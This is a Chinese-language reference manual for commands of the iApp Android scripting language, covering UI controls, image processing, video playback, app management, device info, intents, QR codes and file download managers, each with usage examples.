<p>//输入更变颜色，并且保留状态栏空间，只设置状态栏，不设置软键盘<br>uycl(“#50c4e5”, true, 0)</p>
<p>//输入更变颜色，并且不保留状态栏空间，只设置软键盘，不设置状态栏<br>uycl(“#50c4e5”, false, 1)</p>
<p>说明：<br>常用与设置一体化颜色，以及更变不同的状态栏颜色。</p>
<p>ps:如果不保留状态栏空间的话，你的底部控件可能会与底部软键盘重叠，你可以使用 swh 获取底部虚拟键盘的高度，然后可以增加一个底部外边距。</p>
<p>注意：<br>仅系统android 4.4以及以上才有效果，系统android 5.0以及以上效果更佳！<br>android 4.4以下的系统，无效果！</p>
<p>【ushsp 设置横屏或竖屏】<br>用法：<br>//横屏<br>ushsp(true)<br>//竖屏<br>ushsp(false)</p>
<p>说明：<br>设置屏幕的显示方式，注意的是设置后载入事件将重新执行</p>
<p>【bfv 播放视频】<br>用法：(播放SD卡上的视频文件)<br>s a = “%abcd.mp4”<br>bfv(a)</p>
<p>//并且横屏<br>s a = “%abcd.mp4”<br>s b = true<br>bfv(a, b)</p>
<p>//并且横屏<br>s a = “<a href="http://m.baidu.com/abcd.mp4&quot;">http://m.baidu.com/abcd.mp4&quot;</a><br>s b = true<br>bfv(a, b)<br>说明：<br>此方法将全屏播放SD卡上的视频文件。调用自带的播放器。</p>
<p>注意：<br>不支持加载assets文件。支持SD卡文件、应用私有文件、（http）远程网络文件！</p>
<p>支持格式：<br>3gp、MP4、avi</p>
<p>【endcode 结束执行】<br>用法：<br>s a = 1<br>s b = 1<br>f(a == b)<br>{<br>tw(“会提示”)<br>//结束执行代码<br>endcode<br>}<br>tw(“不会提示”)</p>
<p>说明：<br>可用于提前结束执行代码，也可以用于模块的函数结束。</p>
<p>【break 跳出循环以及代码块】<br>用法：<br>w(1 == 1)<br>{<br>syso(“1”)<br>break<br>syso(“2”)<br>}<br>f(1 == 1)<br>{<br>syso(“1”)<br>break<br>syso(“2”)<br>}</p>
<p>说明：<br>代码块当执行 break 语句后，将跳出。</p>
<p>【fn 模块与函数】<br>1.创建一个模块：<br>在程序文件列表，新建一个模块名“mokuai”</p>
<p>2.在模块mokuai.myu里定义各种函数：<br>fn hanshu(a, b)<br>ss(a + b, c)<br>tw(c)<br>end fn<br>fn hanshu(a)<br>tw(a)<br>end fn</p>
<p>3.在事件里根据模块对象来调用函数：<br>s a = “abc”<br>s b = “def”<br>fn mokuai.hanshu(a, b)<br>fn mokuai.hanshu(a)</p>
<p>说明：<br>常用与将重复性的代码，放入模块中执行。</p>
<p>注意：<br>模块的调用过程将不共享使用 调用事件的局部变量；</p>
<p>例：<br>//(m.myu模块代码)<br>fn abc()<br>s bb = “456”<br>sss cc = “789”<br>end fn</p>
<p>//（mian.iyu载入事件代码）<br>s bb = “123”<br>fn abc()</p>
<p>//将提示 123，因为模块代码与事件代码的局部变量是不共享的；<br>tw(bb)</p>
<p>//将提示 789，可以通过全局变量进行共享数据<br>tw(sss.cc)</p>
<p>【ftz 发送通知栏】<br>用法：</p>
<p>ftz(“提醒标题”, “标题”, “内容”, null)<br>{<br>tw(“点击了”)<br>}</p>
<p>//设置显示图标<br>ftz(“提醒标题”, “标题”, “内容”, “%abc.png”)<br>{<br>tw(“点击了”)<br>}</p>
<p>说明：<br>可以用于通知用户。</p>
<p>【uapp 打开App应用或游戏】<br>用法：<br>uapp(“com.iapp”, c)</p>
<p>//或 带有指定类名的启动<br>uapp(“com.iapp”, “com.yougaile.MakeiApp.logoActivity”, c)</p>
<p>说明：<br>输入应用包名，赋值变量； 赋值变量返回启动结果：true 或 false</p>
<p>【uapplist 获取App列表】<br>用法：<br>uapplist(true, b)<br>sgsz(b, 1, d)<br>tw(d)</p>
<p>说明：<br>输入 是否包括获取系统App，返回一个列表数组 至变量 “b”，每列数据将存储一个应用的信息，并且以 “\n”隔开。</p>
<p>其中列内容格式：<br>应用包名，启动类，应用标题，应用版本</p>
<p>【uapplistgo 获取正在运行的App列表】<br>用法：<br>uapplistgo(b)<br>sgsz(b, 1, d)<br>tw(d)</p>
<p>说明：<br>输入 返回一个列表数组 至变量 “b”，每列数据将存储一个应用的信息，并且以 “\n”隔开。</p>
<p>其中列内容格式：<br>应用包名，pid, uid</p>
<p>【uninapp 卸载应用】<br>用法：<br>uninapp(“com.iapp”)</p>
<p>说明：<br>输入应用包名</p>
<p>【huf 上传文件】<br>用法：<br>t()<br>{<br>s a = “<a href="http://abc.com/upfile.php&quot;">http://abc.com/upfile.php&quot;</a><br>s b = “filename=iApp我的应用.apk&amp;test=一款非常好的应用哦”<br>s c = “%abc/iApp.apk”<br>s d = “utf-8”<br>huf(a, b, c, d, e)<br>tw(e)<br>}</p>
<p>2.设置 header文件头，文件头包括了Cookie，User-Agent设备型号。。<br>t()<br>{<br>s a = “<a href="http://abc.com/upfile.php&quot;">http://abc.com/upfile.php&quot;</a><br>s b = “filename=iApp我的应用.apk&amp;test=一款非常好的应用哦”<br>s c = “%abc/iApp.apk”<br>s d = “utf-8”<br>s e = “User-Agent=Mozilla/5.0 (iPad; U; CPU OS 6_0 like Mac OS X; zh-CN; iPad2)||Cookie=aa:123;bb:456;||accept-language=zh-CN”<br>huf(a, b, c, d, e, e)<br>tw(e)<br>}</p>
<p>说明：<br>输入 http接口，表单内容，手机内存选择文件，接口的网页编码， 赋值变量。 返回网页内容将赋值给变量 “e”</p>
<p>【nvw 创建动态控件】<br>用法：<br>//将控件添加至指定的控件作为子控件<br>//输入要添加的控件ID或控件对象，输入添加至指定控件ID或控件对象<br>nvw(id, did)</p>
<p>//输入要添加的控件ID或控件对象，输入添加至指定控件ID或控件对象，输入插入指定序号<br>nvw(id, did, 0)</p>
<p>//创建文本控件<br>//输入控件ID，输入添加至指定控件ID或控件对象，输入控件类型，输入控件属性<br>s id = 123456<br>s did = 1<br>nvw(id, did, “文本”, “width=-2\nheight=-2\ntext=内容”)</p>
<p>//创建文本控件<br>//输入控件ID，输入添加至指定控件ID或控件对象（若不添加则输入null），输入控件类型，输入控件属性，赋值变量为创建控件的对象<br>s id = 123456<br>s did = 1<br>nvw(id, did, “文本”, “width=-2\nheight=-2\ntext=内容”, b)</p>
<p>说明：<br>输入创建的控件ID，输入将新控件添加至指定控件ID或控件对象，创建控件的类型，创建控件的属性，可带有赋值变量</p>
<p>【uall 获取子控件】<br>用法：<br>//输入控件ID或控件对象，输入false时将赋值子控件ID，输入赋值变量将返回一个数据列表<br>uall(1, false, a)</p>
<p>//输入控件ID或控件对象，输入true时将赋值子控件对象，输入赋值变量将返回一个数据列表<br>uall(1, true, a)</p>
<p>s b = 1<br>gslist(a, b，c)<br>tw(c)</p>
<p>说明：<br>获取一个包含子控件的，控件中所有的子控件。</p>
<p>【urvw 移除控件】<br>用法：<br>urvw(3)</p>
<p>说明：<br>输入需要移除的控件ID或控件对象</p>
<p>【sbp 图像分割】<br>用法：<br>//载入一个图像变量，并赋值到图像变量“b”<br>sbp(“%1.png”, b)</p>
<p>//载入一个用户图标，{裁剪图像区域（像素）：x坐标:80，y坐标:90，裁剪宽度:50，裁剪高度:60}<br>//并将裁剪好的赋值到图像变量“b”<br>sbp(“%1.png”, 80, 90, 50, 60, b)</p>
<p>//载入一个SD卡上的图标，{裁剪图像区域（像素）：x坐标:80，y坐标:90，裁剪宽度:50，裁剪高度:60}，图像旋转图像:180度<br>//并将裁剪好的赋值到图像变量“b”<br>sbp(“%1.png”, 80, 90, 50, 60, 180, b)</p>
<p>说明：<br>三种方式载入图像，从图像变量，从用户图标，从SD上图标；并可设置裁剪图片；可设置图像旋转； 并赋值到新的图像变量；</p>
<p>【bfs 保存图像】<br>用法：<br>bfs(b, “%1.jpg”)</p>
<p>//或 压缩比例（1至100）<br>bfs(b, 70, “%1.jpg”)</p>
<p>说明：<br>输入图像变量，输入压缩比例（1至100），输入保存图像的路径，图像将保存至该路径。</p>
<p>【sdeg 启动调试模式】<br>用法：<br>sdeg(0)<br>sdeg(1)<br>sdeg(2)</p>
<p>说明：<br>提示日志方式。0打包后没有任何提示，1打包后可任然打印错误，2打包后记录日志保存至文件 iApp/Log</p>
<p>【tot 获取控件图标】<br>用法：<br>s id = 4<br>tot(id, b)</p>
<p>说明：<br>输入控件ID或控件对象，返回将赋值“b”图像变量。注：此方法仅限于 图片控件，图标按钮控件。</p>
<p>【tzz 图像旋转】<br>用法：<br>sbp(“%1.png”, a)<br>s b = 90<br>tzz(a, b, c)</p>
<p>说明：<br>输入被旋转图像变量，输入旋转度数（逆向旋转数为负数），返回将赋值“c”图像变量。</p>
<p>【tsf 图像缩放】<br>用法：<br>sbp(“%1.png”, a)</p>
<p>//按照倍增缩放，值小于则为缩小，否则为放大<br>s b = 2<br>tsf(a, b, c)</p>
<p>//指定高度与宽度缩放<br>s w = 100<br>s h = 200<br>tsf(a, w, h, c)</p>
<p>说明：<br>输入被缩放图像变量，输入缩放倍数 或 指定图像高度与宽度缩放，返回将赋值“c”图像变量。</p>
<p>【tfz 图像反转】<br>用法：<br>sbp(“%1.png”, a)<br>//水平反转<br>s b = “x”<br>tfz(a, b, c)</p>
<p>//垂直反转<br>s b = “y”<br>tfz(a, b, c)</p>
<p>说明：<br>输入被反转图像变量，输入反转方式 x为水平 y为垂直，返回将赋值“c”图像变量。</p>
<p>【tcc 获取图像变量尺寸】<br>用法：<br>sbp(“%1.png”, a)<br>s b = “w”<br>tcc(a, b, c)<br>tw(c)</p>
<p>s b = “h”<br>tcc(a, b, c)<br>tw(c)</p>
<p>说明：<br>获取图像变量的 w宽度 和 h高度。</p>
<p>【sxb 写入剪切板】<br>用法：<br>s a = “nihao”<br>sxb(a)</p>
<p>说明：<br>可用于复制到剪切板，其他应用可获取到此数据。</p>
<p>【shb 获取剪切板】<br>用法：<br>shb(a)<br>tw(a)</p>
<p>说明：<br>可获取剪切板数据，得到其他地方写入的剪切板数据。</p>
<p>【usjxm 手机休眠】<br>用法：<br>usjxm(false)</p>
<p>说明：<br>设置后手机将不休眠，不锁屏。默认为 true 需要休眠。</p>
<p>【bfvs 播放视频】<br>用法：</p>
<p>//设置SD卡视频文件<br>bfvs(1, “%a.mp4”)</p>
<p>//设置网络远程视频文件<br>bfvs(1, “<a href="http://abc.com/a.mp4&quot;">http://abc.com/a.mp4&quot;</a>)</p>
<p>//增加控制器，c为赋值变量<br>bfvss(1, “media”, c)<br>//开始播放<br>bfvss(1, “st”)</p>
<p>说明：<br>自定义视频播放控件进行播放视频。</p>
<p>注意：<br>不支持加载assets文件。支持SD卡文件、（http）远程网络文件！</p>
<p>支持格式：<br>3gp、MP4、avi</p>
<p>【bfvss 播放视频控制】<br>用法：<br>//开始播放<br>bfvss(1, “st”)</p>
<p>//暂停播放<br>bfvss(1, “pe”)</p>
<p>//停止播放<br>bfvss(1, “sp”)</p>
<p>//定位到指定帧<br>bfvss(1, “seekto”, 300)</p>
<p>//增加控制器，c为赋值变量<br>bfvss(1, “media”, c)</p>
<p>//是否在播放<br>bfvss(1, “ip”, c)<br>tw(c)</p>
<p>//获取视频时长（毫秒）<br>bfvss(1, “dn”, c)<br>tw(c)</p>
<p>//获取当前播放时长（毫秒）<br>bfvss(1, “cn”, c)<br>tw(c)</p>
<p>【addv 加载界面】<br>用法：<br>//界面中载入其他界面<br>s id = 1<br>addv(id, “a.iyu”)<br>addv(id, “b.iyu”)</p>
<p>//侧滑窗体<br>s id = 1<br>addv(id, “a.iyu|b.iyu”)</p>
<p>//滑动窗体，将带有赋值变量。此处变量“b”赋值为根控件列表，先通过 gslist 访问指定序号的根控件。通过 gvs 指定的根控件访问指定ID的控件。<br>s id = 1<br>addv(id, “a.iyu|b.iyu”, b)</p>
<p>说明：<br>输入控件ID，输入界面名，输入辅助参数。可用将一个界面的控件，载入到指定控件作为子控件。</p>
<p>如何设置或获取属性上例 a.iyu 中的控件呢？<br>通过文件名作为对象，进行访问，如：</p>
<p>//注意：此对象的使用方式。<br>ug(a.2, “text”, b)<br>us(a.3, “text”, “你好”)</p>
<p>注意：<br>如果载入事件中使用 addv 滑动窗体进行绑定， 如果还需要给滑动窗体内的界面中的控件设置数据，需要将设置控件的代码写在 载入完毕事件 中。否将将可能设置数据失败。</p>
<p>注意：<br>若增加 侧滑窗体 与 滑动窗体 的子控件，需要在被载入的界面设计中，自设一个根目录，作为界面唯一根目录。</p>
<p>【gvs 获取控件对象】<br>用法：<br>//根据当前界面，来获取控件<br>//输入要获取的控件ID，输入赋值变量<br>gvs(1, c)</p>
<p>//根据控件对象，来获取内部的子控件<br>//输入控件ID或控件对象，输入要获取的控件ID，输入赋值变量<br>gvs(1, 2, c)</p>
<p>说明：<br>常用与于利用根控件获取内部的子控件 或 获取控件对象。获取失败将赋值返回 null</p>
<p>【aslist 添加数据列表】<br>用法：<br>s b = “你好”<br>aslist(a, b)<br>s c = “你好2”<br>aslist(a, c)</p>
<p>//可插入数据到指定序号<br>s c = “你好3”<br>s b = 1<br>aslist(a, c, b)</p>
<p>说明：<br>输入列表对象，输入要添加的数据，输入插入指定序号。</p>
<p>【sslist 数据列表设置数据】<br>用法：<br>s b = 1<br>s c = “数据”<br>sslist(a, b，c)</p>
<p>说明：<br>输入列表对象，输入指定数据序号，输入设置的数据</p>
<p>【gslist 数据列表访问数据】<br>用法：<br>s b = 1<br>gslist(a, b，c)<br>tw(c)</p>
<p>说明：<br>输入列表对象，输入指定数据序号，输入赋值变量</p>
<p>【gslistl 数据列表访问数据总数】<br>用法：<br>gslistl(a, b)<br>tw(b)</p>
<p>说明：<br>输入列表对象，输入赋值变量</p>
<p>【dslist 数据列表删除指定数据】<br>用法：<br>s b = 1<br>dslist(a, b)</p>
<p>//清空所有数据<br>s b = -1<br>dslist(a, b)</p>
<p>说明：<br>输入列表对象，输入指定数据序号</p>
<p>提示：<br>如果需要清空所有数据，[输入指定数据序号]可输入 -1 即会删除当前数据列表所有数据。</p>
<p>【gslistsz 列表数据转化为数组】<br>用法：<br>gslistsz(a, b)</p>
<p>说明：<br>输入列表对象，输入赋值变量</p>
<p>【gslistis 列表数据检查是否存在指定数据】<br>用法：<br>s b = “数据”<br>gslistis(a, b, c)</p>
<p>说明：<br>输入列表对象，被判断的数据，输入赋值变量。赋值数据：true 或 false</p>
<p>【gslistiof 列表数据从头开始检查是否包含该数据】<br>用法：<br>s b = “数据”<br>gslistiof(a, b, c)</p>
<p>说明：<br>输入列表对象，被判断的数据，输入赋值变量</p>
<p>【gslistlof 列表数据从尾开始检查是否包含该数据】<br>用法：<br>s b = “数据”<br>gslistlof(a, b, c)</p>
<p>说明：<br>输入列表对象，被判断的数据，输入赋值变量</p>
<p>【nuibs 背景选择器】<br>用法：<br>//使用颜色作为背景<br>s pressed = “#333333”<br>s selected = “#333333”<br>s normal = “#888888”<br>nuibs(pressed, selected, normal, b)</p>
<p>//使用图像作为背景<br>s pressed = “%a.png”<br>s selected = “%a.png”<br>s normal = “%b.png”<br>nuibs(pressed, selected, normal, b)</p>
<p>//使用渐变颜色作为背景<br>.配置选中状态背景<br>s a = 0<br>s b = 0<br>s c = “#255779|#3e7492|#a6c0cd”<br>s d = “0”<br>s e = “topbottom”<br>ngde(a, b, c, d, e, pressed)</p>
<p>.配置正常状态背景<br>s a = 0<br>s b = 0<br>s c = “#255779|#3e7492|#a6c0cd”<br>s d = “0”<br>s e = “rightleft”<br>ngde(a, b, c, d, e, normal)</p>
<p>s selected = pressed</p>
<p>nuibs(pressed, selected, normal, b)</p>
<p>说明：<br>输入按下背景，输入选中背景，正常状态背景，输入赋值变量。</p>
<p>【ngde 背景调控器】<br>用法：<br>//输入圆角半径，输入背景填充色，输入赋值变量<br>s a = 15<br>s b = “#888888”<br>ngde(a, b, c)</p>
<p>//输入边框宽度，输入背景填充色，输入边框颜色，输入赋值变量<br>s a = 5<br>s b = “#888888”<br>s c = “#333333”<br>ngde(a, b, c, d)</p>
<p>//输入边框宽度，输入圆角半径，输入背景填充色，输入边框颜色，输入赋值变量<br>s a = 5<br>s b = 15<br>s c = “#888888”<br>s d = “#333333”<br>ngde(a, b, c, d, e)</p>
<p>//颜色渐变。输入边框宽度，输入圆角半径，输入背景填充渐变色组，输入边框颜色，输入颜色渐变方向，输入赋值变量<br>s a = 5<br>s b = 15<br>s c = “#255779|#3e7492|#a6c0cd”<br>s d = “#333333”<br>s e = “topbottom”<br>ngde(a, b, c, d, e, f)</p>
<p>说明：<br>背景空调生成的赋值变量，可配合背景选择器进行应用。</p>
<p>注意：<br>ngde 代码将赋值返回一个背景对象，此背景对象如果被多个不同大小的控件引用为背景。因为控件的大小不同，会导致此背景对象大小被修改。从而影响其他引用者控件。</p>
<p>提示：<br>边框与圆角半径 若不想调整，可设值为0 。适用于颜色渐变，不需要调节圆角半径和边框。</p>
<p>颜色渐变方向说明：<br>    topbottom：绘制从顶部梯度至底部<br>    trbl：借鉴右上角渐变左下角<br>    rightleft：绘制从右侧的梯度向左<br>    brtl：借鉴右下角渐变左上角<br>    bottomtop：绘制从底部梯度顶端<br>    bltr：借鉴渐变左下角到右上角<br>    leftright：绘制从左侧的梯度向右<br>    TL_BR：从绘制渐变的左上角到右下角</p>
<p>【sit 目标的设置】<br>用法：<br>//如，分享软件<br>//输入对象，输入属性标识，输入属性值<br>sit(a, “action”, “android.intent.action.SEND”)<br>sit(a, “type”, “text/plain”)<br>sit(a, “extra”, “android.intent.extra.SUBJECT”, “共享软件”)<br>sit(a, “extra”, “android.intent.extra.TEXT”, “共享内容文本”)<br>sit(a, “flags”, 268435456)<br>uit(a, “chooser”, “标题”)</p>
<p>说明：<br>常用于调用系统程序以及功能 或 第三方程序功能。</p>
<p>可属性标识：action、type、extra、flags、data、classname、component</p>
<p>【uit 目标的执行】<br>用法：<br>//输入目标对象，输入属性，输入属性值<br>uit(a, “chooser”, “标题”)</p>
<p>//输入目标对象，输入属性，输入请求数值<br>uit(a, “result”, 1)</p>
<p>//输入目标对象<br>uit(a)</p>
<p>说明：<br>常用于调用系统程序以及功能 或 第三方程序功能。</p>
<p>属性支持：chooser、result</p>
<p>【git 目标获取参数】<br>用法：<br>//输入目标对象，输入属性标识，输入赋值变量<br>git(a, “action”, c)<br>git(a, “type”, c)<br>git(a, “extra”, “title”, c)<br>git(a, “flags”, c)</p>
<p>说明：<br>获取目标的属性。</p>
<p>【uqr 二维码扫描】<br>用法：</p>
<p>//扫描二维码<br>uqr()</p>
<p>//扫描结果，需要在 回调结果事件 写代码<br>f(st_sC == 1102)<br>{<br>git(st_iT, “extra”, “result”, c)<br>tw(c)<br>}</p>
<p>//生成二维码图像<br>s a = “<a href="https://m.baidu.com&quot;/">https://m.baidu.com&quot;</a><br>//输入字符串数据，输入图像长宽像素，输入赋值变量；将返回一个图像变量<br>uqr(a, 400, c)</p>
<p>//识别二维码图像<br>//输入图像变量或图片路径，输入赋值变量；将返回一个字符串<br>uqr(a, c)</p>
<p>说明：<br>常用于网络通用二维码扫描。</p>
<p>【zdp  dip转换px】<br>用法：<br>s dp = 10<br>//输入dp数值，输入赋值变量<br>zdp(dp, c)</p>
<p>说明：<br>用于常用数据转换。</p>
<p>【zpd  px转换dip】<br>用法：<br>s px = 10<br>//输入px数值，输入赋值变量<br>zpd(px, c)</p>
<p>说明：<br>用于常用数据转换。</p>
<p>【zps  px转换sp】<br>用法：<br>s px = 10<br>//输入px数值，输入赋值变量<br>zps(px, c)</p>
<p>说明：<br>用于常用数据转换。</p>
<p>【zsp  sp转换px】<br>用法：<br>s sp = 10<br>//输入sp数值，输入赋值变量<br>zsp(sp, c)</p>
<p>说明：<br>用于常用数据转换。</p>
<p>【lan 跳转界面动画】<br>用法：<br>uigo(“abc.iyu”)<br>//输入跳转界面动画的序号；6 右往左推出效果<br>lan(6)</p>
<p>说明：<br>用于跳转界面时候进行的动画效果</p>
<p>提示：<br>0.淡入淡出效果 1.放大淡出效果 2.转动淡出效果1 3.转动淡出效果2 4.左上角展开淡出效果 5.压缩变小淡出效果 6.右往左推出效果 7.下往上推出效果 8.左右交错效果 9.放大淡出效果 10.缩小效果 11.上下交错效果</p>
<p>【sjxx 获取设备信息】<br>用法：<br>sjxx(a)<br>sgsz(a, 0, d)<br>tw(d)</p>
<p>说明：<br>获取手机基本信息，将返回一个数组到赋值变量“a”，数组格式如下：</p>
<p>数据格式：（真实数据 \n 旁边将不没有空格）</p>
<p>CPU型号 \n CPU频率<br>屏幕宽度 \n 屏幕高度 \n 分辨率宽度 \n 分辨率高度<br>手机型号 \n 手机品牌 \n 手机SDK</p>
<p>【simsi 获取设备imsi】<br>用法：<br>simsi(a)<br>tw(a)</p>
<p>说明：<br>常用于识别用户的手段。</p>
<p>【simei 获取设备imei】<br>用法：<br>simei(a)<br>tw(a)</p>
<p>说明：<br>常用于识别用户的手段。</p>
<p>【endkeyboard 强制隐藏虚拟键盘】<br>用法：<br>endkeyboard()</p>
<p>说明：<br>常用于需要隐藏安卓弹出的虚拟键盘。</p>
<p>【hdfl 文件下载器】<br>用法：<br>//两个参数的方法设置<br>s savedir = “%SaveDir”<br>//输入下载保存目录，输入赋值变量返回一个下载器对象<br>hdfl(savedir, a)<br>{<br>//每当下载完一个执行<br>//系统赋值 st_drD 文件下载项的序号<br>//系统赋值 st_drI 文件下载项的状态</p>
<p>//获取下载的URL<br>ulag(a, st_drD, “url”, b1)<br>syso(b1)</p>
<p>//获取自定义整数标识<br>ulag(a, st_drD, “type”, b2)<br>syso(b2)</p>
<p>//获取自定义参数任意数据<br>ulag(a, st_drD, “text”, b3)<br>syso(b3)</p>
<p>//获取下载文件保存的路径<br>ulag(a, st_drD, “filename”, b4)<br>syso(b4)</p>
<p>}<br>else<br>{<br>//当下载完目前所有执行<br>//系统赋值 st_drJ 本次文件下载完成总数<br>ufnsui()<br>{<br>tw(st_drJ)<br>}<br>}</p>
<p>//三个参数的方法设置<br>s tempdir = “%TempDir”<br>s savedir = “%SaveDir”<br>//输入下载临时文件保存目录，输入下载保存目录，输入赋值变量返回一个下载器对象<br>hdfl(tempdir, savedir, a)<br>{<br>ufnsui()<br>{<br>tw(st_drD)<br>}<br>}<br>else<br>{<br>ufnsui()<br>{<br>tw(st_drJ)<br>}<br>}</p>
<p>//六个参数的方法设置<br>s tempdir = “%TempDir”<br>s savedir = “%SaveDir”<br>//输入下载临时文件保存目录，输入下载保存目录, 下载线程数量，连接网络超时时间（25秒的意思），文件重复是否覆盖，输入赋值变量返回一个下载器对象<br>hdfl(tempdir, savedir, 3, 25000, true, a)<br>{<br>ufnsui()<br>{<br>tw(st_drD)<br>}<br>}<br>else<br>{<br>ufnsui()<br>{<br>tw(st_drJ)<br>}<br>}</p>
<p>说明：<br>常用与单个或多个的文件下载。推荐图片列表下载或小文件下载。</p>
<p>提示：<br>代码{ 区域中 }属于线程内执行。在其中更新界面控件属性需要使用ufnsui代码<br>上例子使用tw代码，并且用了ufnsui代码。</p>
<p>【hdfla 文件下载器 增加文件下载项】<br>用法：<br>//创建一个文件下载器<br>hdfl(tempdir, a)<br>{<br>ufnsui()<br>{<br>tw(st_drD)<br>}<br>}<br>else<br>{<br>ufnsui()<br>{<br>tw(st_drJ)<br>}<br>}</p>
<p>//增加下载项<br>//输入下载器对象，输入下载连接URL，输入自定义整数标识，输入自定义参数任意数据<br>hdfla(a, “<a href="http://abc.com/1.jpg&quot;">http://abc.com/1.jpg&quot;</a>, 1, “abcd123”)</p>
<p>//增加下载项，并且自定义保存目录<br>//输入下载器对象，输入下载连接URL，输入自定义整数标识，输入自定义参数任意数据，输入自定义保存路径<br>hdfla(a, “<a href="http://abc.com/2.jpg&quot;">http://abc.com/2.jpg&quot;</a>, 1, “abcd123”, “%abc.jpg”)</p>
<p>说明：<br>调用下载器增加下载项，并且立刻进行下载。</p>
<p>【hdd 配置下载管理器】<br>用法：<br>//下载产生的临时文件目录<br>s a = “%tempdir”<br>//下载至保存的目录<br>s b = “%filedir”<br>//允许同时下载任务数量<br>s c = 3<br>//每个任务开启线程数量<br>s d = 3<br>//连接失败重试次数<br>s e = 2<br>//连接超时时间，25秒的意思<br>s f = 25000<br>//是否显示下载进度通知<br>s g = true<br>hdd(a, b, c, d, e, f, g)</p>
<p>说明：<br>如果不使用此代码进行配置，那么系统将使用默认配置。下载配置器可以很方便的制作下载文件，并且方便管理。</p>
<p>默认目录属性：<br>临时文件目录：iApp/DownloadFileDir/TempDefaultDownFile<br>保存文件目录：iApp/DownloadFileDir/DefaultDownFile</p>
<p>【hdda 下载管理器 增加文件下载项】<br>用法：</p>
<p>//===========方法一<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a></p>
<p>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”</p>
<p>//输入自定义参数任意数据<br>s data = “abcde123”</p>
<p>//变量v为赋值变量，为下载对象<br>hdda(url, name, data, v)</p>
<p>//===========方法二<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a></p>
<p>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”</p>
<p>//下载任务的标题<br>s title = “abc.apk最新版”</p>
<p>//输入自定义参数任意数据<br>s data = “abcde123”</p>
<p>//变量v为赋值变量，为下载对象<br>hdda(url, name, title, data, v)</p>
<p>//===========方法三<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a></p>
<p>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”</p>
<p>//下载任务的标题<br>s title = “abc.apk最新版”</p>
<p>//下载任务的图标<br>s icon = “@abc.png”</p>
<p>//输入自定义参数任意数据<br>s data = “abcde123”</p>
<p>//变量v为赋值变量，为下载对象<br>hdda(url, name, title, icon, data, v)</p>
<p>//===========方法四<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a></p>
<p>//保存至目录<br>s dir = “%filedir”</p>
<p>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”</p>
<p>//下载任务的标题<br>s title = “abc.apk最新版”</p>
<p>//下载任务的图标<br>s icon = “@abc.png”</p>
<p>//是否显示下载进度通知<br>s notsohw = true</p>
<p>//输入自定义参数任意数据<br>s data = “abcde123”</p>
<p>//变量v为赋值变量，为下载对象<br>hdda(url, dir, name, title, icon, notsohw, data, v)</p>
<p>说明：<br>增加常用的网络文件进行下载。</p>
<p>【hddgl 获取下载管理器下载列表】<br>用法：<br>//输入赋值变量返回下载列表<br>hddgl(list)</p>
<p>//使用for循环下载列表<br>for(b; list)<br>{<br>hddg(b, “url”, c)<br>syso(c)<br>}</p>
<p>说明：<br>获取下载管理器所有的下载列表。</p>
<p>【hddg 获取下载管理器获取下载项属性】<br>用法：<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”<br>//输入自定义参数任意数据<br>s data = “abcde123”<br>//变量v为赋值变量，为下载对象<br>hdda(url, name, data, v)</p>
<p>//===========获取下载项的属性<br>//获取下载项的 ID<br>hddg(v, “id”, b)</p>
<p>//获取下载项的 下载链接<br>hddg(v, “url”, b)</p>
<p>//获取下载项的 保存的绝对路径<br>hddg(v, “dirfilename”, b)</p>
<p>//获取下载项的 下载链接的md5<br>hddg(v, “urlmd5”, b)</p>
<p>//获取下载项的 保存的目录<br>hddg(v, “dir”, b)</p>
<p>//获取下载项的 保存的文件名<br>hddg(v, “filename”, b)</p>
<p>//获取下载项的 下载文件的大小（字节）<br>hddg(v, “contentlength”, b)</p>
<p>//获取下载项的 已下载的数据（字节）<br>hddg(v, “equivalent”, b)</p>
<p>//获取下载项的 当前下载速度（字节）<br>hddg(v, “downloadspeed”, b)</p>
<p>//获取下载项的 当前下载进度百分比<br>hddg(v, “downloadpercentage”, b)</p>
<p>//获取下载项的 下载状态；（0为等待下载；1为正在下载；2为下载完成；3下载已经暂停或停止；-1下载失败；-2已删除）<br>hddg(v, “status”, b)</p>
<p>//获取下载项的 是否显示下载通知<br>hddg(v, “notificationshow”, b)</p>
<p>//获取下载项的 自定义的数据<br>hddg(v, “text”, b)</p>
<p>//获取下载项的 通知标题<br>hddg(v, “title”, b)</p>
<p>//获取下载项的 通知图标<br>hddg(v, “icon”, b)</p>
<p>说明：<br>可获取详细的下载项目状态属性。</p>
<p>【hdds 设置下载管理器下载项的属性】<br>用法：<br>//下载的链接<br>s url = “<a href="http://abc.com/abc.apk&quot;">http://abc.com/abc.apk&quot;</a><br>//保存的文件名（仅输入文件名,请勿不包含目录）<br>s name = “abc.apk”<br>//输入自定义参数任意数据<br>s data = “abcde123”<br>//变量v为赋值变量，为下载对象<br>hdda(url, name, data, v)</p>
<p>//===========可设置的下载项属性</p>
<p>//设置下载项的 下载状态；（0为等待下载；1为正在下载；2为下载完成；3下载已经暂停或停止；-1下载失败；-2已删除）<br>hdds(v, “status”, 0)</p>
<p>//设置下载项的 是否显示下载通知<br>hdds(v, “notificationshow”, true)</p>
<p>//设置下载项的 自定义的数据<br>hdds(v, “text”, “abcd123”)</p>
<p>//设置下载项的 通知标题<br>hdds(v, “title”, “abc.apk最新版本”)</p>
<p>//设置下载项的 通知图标<br>hdds(v, “icon”, “@abc.png”)</p>
<p>说明：<br>设置下载项目的属性。</p>
<p>【hdduigo 跳转至下载管理器】<br>用法：<br>//跳转至下载管理器<br>hdduigo()</p>
<p>//跳转至下载管理器，并且自定义标题栏颜色<br>//主体颜色<br>s a = “#387bd6”<br>//底部横杠颜色<br>s b = “#255eab”<br>hdduigo(a, b)</p>
<p>说明：<br>跳转至文件下载的管理器。</p>
